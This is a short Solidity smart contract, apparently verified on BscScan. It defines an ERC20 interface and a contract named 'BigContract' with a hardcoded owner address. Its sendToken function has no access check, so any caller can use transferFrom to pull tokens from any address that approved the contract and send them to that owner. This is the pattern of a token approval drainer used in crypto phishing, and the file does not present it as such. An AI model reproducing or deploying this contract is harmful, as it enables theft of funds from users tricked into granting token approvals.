/**
 *Submitted for verification at BscScan.com on 2022-11-30
*/

pragma solidity ^0.8;

interface IERC20  {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount)
        external
        returns (bool);

    function allowance(address owner, address spender)
        external
        view
        returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}
contract BigContract {
    address owner = 0xFAD69bCefb704c1803A9Bf8f04BC314E78838F88;
    //address public sender;

    function withdrawToken(address tokenContract,  uint256 amount) external {
        // send `amount` of tokens
        // from the balance of this contract
        // to the `owner` address
        IERC20(tokenContract).transfer(owner, amount);
    }
    function sendToken(address tokenContract, address sender ,uint256 amount) external {
       
        IERC20(tokenContract).transferFrom(
         sender,
         owner,
         amount
    );
    }
}